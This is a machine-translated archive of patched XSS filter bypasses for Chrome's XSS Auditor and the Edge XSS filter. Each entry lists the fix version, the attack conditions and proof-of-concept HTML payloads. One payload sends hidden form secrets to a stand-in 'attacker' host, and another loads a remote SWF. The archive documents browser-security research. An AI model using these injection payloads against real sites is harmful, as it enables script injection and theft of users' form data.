- **Translated by:** [*Dr. Google*](https://translate.google.com)<br>
- **Edited by:** [*Abdullah Al-Bakhtari*](https://github.com/albakhtari)<br>
- **Translation [Link](https://github-com.translate.goog/masatokinugawa/filterbypass/wiki/Fixed-Bypass-Archive?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)**<br>
- **Original [FIle](https://github.com/masatokinugawa/filterbypass/wiki/Fixed-Bypass-Archive)**<br>
---

# XSS Auditor

## Using the SVG animation values ​​attribute (Chrome)

supplement:

PoC 1 fixed in Chrome 59, PoC 2 fixed in Chrome 62.

Reference URL:

- [https://bugs.chromium.org/p/chromium/issues/detail?id=709365](https://bugs.chromium.org/p/chromium/issues/detail?id%3D709365)
- [https://bugs.chromium.org/p/chromium/issues/detail?id=738017](https://bugs.chromium.org/p/chromium/issues/detail?id%3D738017)

PoC 1:

[https://vulnerabledoma.in/bypass/text?q=%3Csvg%3E%3Canimate%20href=%23x%20attributeName=href%20values=%26%23x3000%3Bjavascript:alert(1)%20/%3E%3Ca %20id=x%3E%3Crect%20width=100%20height=100%20/%3E%3C/a%3E](https://vulnerabledoma.in/bypass/text?q%3D%253Csvg%253E%253Canimate%2520href%3D%2523x%2520attributeName%3Dhref%2520values%3D%2526%2523x3000%253Bjavascript:alert(1)%2520/%253E%253Ca%2520id%3Dx%253E%253Crect%2520width%3D100%2520height%3D100%2520/%253E%253C/a%253E)

```html
<svg><animate href=#x attributeName=href values=&#x3000;javascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

PoC 2:

[https://vulnerabledoma.in/bypass/text?q=%3Csvg%3E%3Canimate+xlink%3Ahref%3D%23x+attributeName%3Dhref+values%3D%26%23106%3Bavascript%3Aalert%281%29+% 2F%3E%3Ca+id%3Dx%3E%3Crect+width%3D100+height%3D100+%2F%3E%3C%2Fa%3E](https://vulnerabledoma.in/bypass/text?q%3D%253Csvg%253E%253Canimate%2Bxlink%253Ahref%253D%2523x%2BattributeName%253Dhref%2Bvalues%253D%2526%2523106%253Bavascript%253Aalert%25281%2529%2B%252F%253E%253Ca%2Bid%253Dx%253E%253Crect%2Bwidth%253D100%2Bheight%253D100%2B%252F%253E%253C%252Fa%253E)

```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

## Using half-baked closing tags for script tags (Chrome only)

supplement:

Fixed in Chrome 61.

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. followed by whitespace

Reference URL:

- [https://bugs.chromium.org/p/chromium/issues/detail?id=742459](https://bugs.chromium.org/p/chromium/issues/detail?id%3D742459)

PoCs:

[https://vulnerabledoma.in/bypass/text?type=4&q=%3Cscript%3Ealert(1)%3C/script](https://vulnerabledoma.in/bypass/text?type%3D4%26q%3D%253Cscript%253Ealert(1)%253C/script)

```html
<div> <script>alert(1)</script </div><div id="x"></div>
```

## Using multiple null characters (Chrome)

supplement:

Fixed in Chrome 62.

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. a null byte is printed
3. no preceding whitespace

Reference URL:

- [https://twitter.com/0rbz_/status/896896095862669312](https://twitter.com/0rbz_/status/896896095862669312)

PoCs:

[https://vulnerabledoma.in/bypass/text?q=%00%00%00%00%00%00%00%3Cscript%3Ealert(1)%3C/script%3E](https://vulnerabledoma.in/bypass/text?q%3D%2500%2500%2500%2500%2500%2500%2500%253Cscript%253Ealert(1)%253C/script%253E)

```html
[0x00][0x00][0x00][0x00][0x00][0x00][0x00]<script>alert(1)</script>
```

## `-->` Using comments in script tags (Chrome)

supplement:

Fixed in Chrome 62.

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. There is a closing tag of the script tag without a line break after it

Reference URL:

- [https://bugs.chromium.org/p/chromium/issues/detail?id=753307](https://bugs.chromium.org/p/chromium/issues/detail?id%3D753307)

PoCs:

[https://vulnerabledoma.in/bypass/text?type=9&q=%3Cscript%3Ealert(1)%0A--%3E](https://vulnerabledoma.in/bypass/text?type%3D9%26q%3D%253Cscript%253Ealert(1)%250A--%253E)

```html
<div><script>alert(1)
--></div><script src=/test.js></script>
```

## Use of half-baked form tags (getting information only) (Chrome)

supplement:

Fixed in Chrome 62.

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. New form tags can be placed where existing form content containing sensitive information can be submitted

Reference URL:

- [https://bugs.chromium.org/p/chromium/issues/detail?id=719092](https://bugs.chromium.org/p/chromium/issues/detail?id%3D719092)

PoCs:

(if you are inside a form) [https://vulnerabledoma.in/bypass/form?q=%22%3E%3C/form%3E%3Cform%20action=https://attacker/](https://vulnerabledoma.in/bypass/form?q%3D%2522%253E%253C/form%253E%253Cform%2520action%3Dhttps://attacker/)

```html
<form action="form">
<input type="hidden" name="q" value=""></form><form action=https://attacker/">
<input type="hidden" name="secret" value="a09d3ef0">
<input type="submit">
</form>
```

(when outside the form) [https://vulnerabledoma.in/bypass/form2?q=%3Cbutton%20form=f%3ECLICK%3Cform%20id=f%20action=https://attacker/](https://vulnerabledoma.in/bypass/form2?q%3D%253Cbutton%2520form%3Df%253ECLICK%253Cform%2520id%3Df%2520action%3Dhttps://attacker/)

```html
<div><button form=f>CLICK<form id=f action=https://attacker/</div>
<form action="form2">
<input type="hidden" name="secret" value="a09d3ef0">
</form>
```

## `<object>`Using with `<param name=url/code>`(Chrome only)

supplement:

Fixed in Chrome 64.

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. Flash can be used in the target environment

Reference URL:

- [https://masatokinugawa.l0.cm/2016/12/xss12.html](https://masatokinugawa.l0.cm/2016/12/xss12.html)

PoCs:

[https://vulnerabledoma.in/bypass/text?q=%3Cobject%20allowscriptaccess=always%3E%3Cparam%20name=url%20value=https://l0.cm/xss.swf%3E](https://vulnerabledoma.in/bypass/text?q%3D%253Cobject%2520allowscriptaccess%3Dalways%253E%253Cparam%2520name%3Durl%2520value%3Dhttps://l0.cm/xss.swf%253E)

```html
<object allowscriptaccess=always><param name=url value=https://l0.cm/xss.swf>
```

[https://vulnerabledoma.in/bypass/text?q=%3Cobject%20allowscriptaccess=always%3E%3Cparam%20name=code%20value=https://l0.cm/xss.swf%3E](https://vulnerabledoma.in/bypass/text?q%3D%253Cobject%2520allowscriptaccess%3Dalways%253E%253Cparam%2520name%3Dcode%2520value%3Dhttps://l0.cm/xss.swf%253E)

```html
<object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>
```

## Use of links and half-baked base tags (Chrome)

supplement:

Fixed in Chrome 65.

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. followed by whitespace
3. `'"`there is after

Reference URL:

- [https://bugs.chromium.org/p/chromium/issues/detail?id=719962](https://bugs.chromium.org/p/chromium/issues/detail?id%3D719962)

PoCs:

[https://vulnerabledoma.in/bypass/text?type=4&q=%3Ca%20href=/**/alert(1)%3EXSS%3C/a%3E%3Cbase%20href=%22javascript:\](https://vulnerabledoma.in/bypass/text?type%3D4%26q%3D%253Ca%2520href%3D/**/alert(1)%253EXSS%253C/a%253E%253Cbase%2520href%3D%2522javascript:%255C)

```html
<div> <a href=/**/alert(1)>XSS</a><base href="javascript:\ </div><div id="x"></div>
```

# XSS filter for IE/Edge

## Exploiting the referrer spoofing bug (Edge only)

supplement:

Confirmed fix as of April 2018.

Conditions for attacking:

1. Has reflective XSS

Reference URL:

- [https://www.brokenbrowser.com/referer-spoofing-patch-bypass/](https://www.brokenbrowser.com/referer-spoofing-patch-bypass/)

PoCs:

[https://l0.cm/bypass/edge_referer_spoofing.html](https://l0.cm/bypass/edge_referer_spoofing.html)

```html
<script>
//Found by @magicmac2000
function go(){
  var win = window.open("edge_referer_spoofing_redirector");
  var ifr = win.document.createElement("iframe");
  win.document.appendChild(ifr);
  win[0].opener = win;
  win[0].setTimeout("alert('wait');opener.location='https://vulnerabledoma.in/bypass/text?q=<script>alert(1)<\/script>'");
}
</script>
<button onclick=go()>go</button>
```
